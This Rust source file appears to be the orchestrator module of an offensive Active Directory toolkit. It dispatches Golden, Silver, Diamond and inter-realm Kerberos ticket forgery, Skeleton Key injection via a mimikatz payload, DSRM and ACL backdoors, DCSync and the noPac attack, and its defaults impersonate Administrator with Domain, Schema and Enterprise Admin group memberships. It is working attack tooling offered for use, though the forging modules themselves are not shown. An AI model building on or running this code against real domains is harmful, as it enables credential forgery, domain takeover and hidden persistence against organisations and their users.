//! Top-level orchestrator for the forge pipeline.
//! Takes a ForgeConfig and dispatches to the appropriate forging module.

use colored::Colorize;
use overthrone_core::error::Result;
use serde::{Deserialize, Serialize};

use crate::{acl_backdoor, dcsync_user, diamond, dsrm, golden, nopac, silver, skeleton};

/// What kind of ticket/persistence to forge
#[derive(Debug, Clone, Serialize, Deserialize)]
#[allow(missing_docs)]
pub enum ForgeAction {
    /// `GoldenTicket` variant
    GoldenTicket,
    /// `` variant
    SilverTicket { target_spn: String },
    /// `DiamondTicket` variant
    DiamondTicket,
    /// `` variant
    InterRealmTgt { target_domain: String },
    /// `SkeletonKey` variant
    SkeletonKey,
    /// `DsrmBackdoor` variant
    DsrmBackdoor,
    /// `` variant
    DcSyncUser { target_user: String },
    /// `` variant
    AclBackdoor { target_dn: String, trustee: String },
    /// `` variant
    NoPac { target_dc: String },
}

impl std::fmt::Display for ForgeAction {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::GoldenTicket => write!(f, "Golden Ticket"),
            Self::SilverTicket { target_spn } => write!(f, "Silver Ticket ({})", target_spn),
            Self::DiamondTicket => write!(f, "Diamond Ticket"),
            Self::InterRealmTgt { target_domain } => {
                write!(f, "Inter-Realm TGT → {}", target_domain)
            }
            Self::SkeletonKey => write!(f, "Skeleton Key"),
            Self::DsrmBackdoor => write!(f, "DSRM Backdoor"),
            Self::DcSyncUser { target_user } => write!(f, "DCSync ({})", target_user),
            Self::AclBackdoor { target_dn, trustee } => {
                write!(f, "ACL Backdoor ({} → {})", trustee, target_dn)
            }
            Self::NoPac { target_dc } => write!(f, "noPac (target DC: {target_dc})"),
        }
    }
}
/// Structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ForgeConfig {
    /// Domain controller IP address
    pub dc_ip: String,
    /// Domain FQDN
    pub domain: String,
    /// Username for authentication
    pub username: String,
    /// Password for authentication
    pub password: Option<String>,
    /// Hash value
    pub nt_hash: Option<String>,
    /// action field
    pub action: ForgeAction,
    /// krbtgt hash (RC4/AES) — required for Golden/Diamond
    pub krbtgt_hash: Option<String>,
    /// krbtgt AES256 key — preferred for Diamond tickets
    pub krbtgt_aes256: Option<String>,
    /// Service account hash — required for Silver tickets
    pub service_hash: Option<String>,
    /// Domain SID (S-1-5-21-...)
    pub domain_sid: Option<String>,
    /// Target user to impersonate in forged ticket
    pub impersonate: Option<String>,
    /// User RID to embed in PAC (default: 500 = Administrator)
    pub user_rid: u32,
    /// Group RIDs for PAC (default: DA, EA, Schema Admins, etc.)
    pub group_rids: Vec<u32>,
    /// Extra SIDs to inject (for inter-realm / SID history)
    pub extra_sids: Vec<String>,
    /// Ticket lifetime in hours
    pub lifetime_hours: u32,
    /// Output path for .kirbi / .ccache file
    pub output_path: Option<String>,
    /// Path to local payload binary (e.g. mimikatz.exe for skeleton key)
    pub payload_path: Option<String>,
    /// Master password for Skeleton Key injection (defaults to "overthrone")
    pub skeleton_master_password: Option<String>,
}

impl ForgeConfig {
    /// Return the effective impersonation user, defaulting to `Administrator`.
    pub fn effective_impersonate(&self) -> &str {
        self.impersonate.as_deref().unwrap_or("Administrator")
    }

    /// Return the effective group RIDs, using defaults if none are configured.
    pub fn effective_groups(&self) -> Vec<u32> {
        if self.group_rids.is_empty() {
            // Default: Domain Admins(512), Domain Users(513), Schema Admins(518),
            // Enterprise Admins(519), Group Policy Creator(520)
            vec![512, 513, 518, 519, 520]
        } else {
            self.group_rids.clone()
        }
    }

    /// Return the effective ticket lifetime, defaulting to 10 hours.
    pub fn effective_lifetime(&self) -> u32 {
        if self.lifetime_hours == 0 {
            10
        } else {
            self.lifetime_hours
        }
    }
}

/// Result of a forge operation
#[derive(Debug, Clone, Serialize)]
pub struct ForgeResult {
    /// action field
    pub action: String,
    /// Domain FQDN
    pub domain: String,
    /// success field
    pub success: bool,
    /// Raw byte data
    pub ticket_data: Option<ForgedTicket>,
    /// persistence result field
    pub persistence_result: Option<PersistenceResult>,
    /// message field
    pub message: String,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct ForgedTicket {
    /// Classification for this object.
    pub ticket_type: String,
    /// impersonated user field
    pub impersonated_user: String,
    /// Domain FQDN
    pub domain: String,
    /// Service Principal Name
    pub spn: String,
    /// Classification for this object.
    pub encryption_type: String,
    /// Stable unique identifier.
    pub valid_from: String,
    /// Stable unique identifier.
    pub valid_until: String,
    /// Stable unique identifier.
    pub group_rids: Vec<u32>,
    /// Security Identifier
    pub extra_sids: Vec<String>,
    /// Filesystem path.
    pub kirbi_path: Option<String>,
    /// Filesystem path.
    pub ccache_path: Option<String>,
    /// kirbi base64 field
    pub kirbi_base64: Option<String>,
    /// Size in bytes
    pub ticket_size_bytes: usize,
}
/// Structure
#[derive(Debug, Clone, Serialize)]
pub struct PersistenceResult {
    /// mechanism field
    pub mechanism: String,
    /// Target domain FQDN
    pub target: String,
    /// success field
    pub success: bool,
    /// details field
    pub details: String,
    /// cleanup command field
    pub cleanup_command: Option<String>,
}

/// Run the forge pipeline.
pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
    let sep = "═══════════════════════════════════════════════";

    println!("\n{}", sep.bright_magenta());
    println!(
        "{} {} ({})",
        "🔨 FORGE".bright_magenta().bold(),
        config.action.to_string().as_str().bright_white().bold(),
        config.domain.as_str().dimmed()
    );
    println!("{}\n", sep.bright_magenta());

    let result = match &config.action {
        ForgeAction::GoldenTicket => golden::forge_golden_ticket(config).await?,
        ForgeAction::SilverTicket { target_spn } => {
            silver::forge_silver_ticket(config, target_spn).await?
        }
        ForgeAction::DiamondTicket => diamond::forge_diamond_ticket(config).await?,
        ForgeAction::InterRealmTgt { target_domain } => {
            golden::forge_interrealm_tgt(config, target_domain).await?
        }
        ForgeAction::SkeletonKey => skeleton::inject_skeleton_key(config).await?,
        ForgeAction::DsrmBackdoor => dsrm::enable_dsrm_backdoor(config).await?,
        ForgeAction::DcSyncUser { target_user } => {
            dcsync_user::dcsync_single_user(config, target_user).await?
        }
        ForgeAction::AclBackdoor { target_dn, trustee } => {
            acl_backdoor::install_acl_backdoor(config, target_dn, trustee).await?
        }
        ForgeAction::NoPac { target_dc } => {
            let result = nopac::run_nopac(config, target_dc).await?;
            ForgeResult {
                action: config.action.to_string(),
                domain: config.domain.clone(),
                success: result.completed,
                ticket_data: result.tgt.as_ref().map(|tgt| ForgedTicket {
                    ticket_type: "TGT".to_string(),
                    impersonated_user: target_dc.clone(),
                    domain: config.domain.clone(),
                    spn: format!("krbtgt/{}", config.domain),
                    encryption_type: "TGT".to_string(),
                    valid_from: String::new(),
                    valid_until: String::new(),
                    group_rids: config.effective_groups(),
                    extra_sids: config.extra_sids.clone(),
                    kirbi_path: None,
                    ccache_path: None,
                    kirbi_base64: None,
                    ticket_size_bytes: tgt.ticket.enc_part.cipher.len(),
                }),
                persistence_result: None,
                message: if result.completed {
                    format!(
                        "noPac attack completed. Computer: {}, Domain SID: {}",
                        result.computer_name, result.domain_sid
                    )
                } else {
                    format!("noPac attack failed: {}", result.error.unwrap_or_default())
                },
            }
        }
    };

    // Summary
    let status = if result.success {
        "✓ SUCCESS".green().bold()
    } else {
        "✗ FAILED".red().bold()
    };
    println!("\n{} {}", status, result.message.as_str().bright_white());

    if let Some(ref ticket) = result.ticket_data {
        println!(
            "  {} {} as {}",
            "Ticket:".dimmed(),
            ticket.ticket_type.as_str().bright_cyan(),
            ticket.impersonated_user.as_str().bright_yellow()
        );
        println!(
            "  {} {} → {}",
            "Valid:".dimmed(),
            ticket.valid_from.as_str().bright_green(),
            ticket.valid_until.as_str().bright_green()
        );
        if let Some(ref path) = ticket.kirbi_path {
            println!("  {} {}", "Saved:".dimmed(), path.as_str().bright_white());
        }
    }

    Ok(result)
}
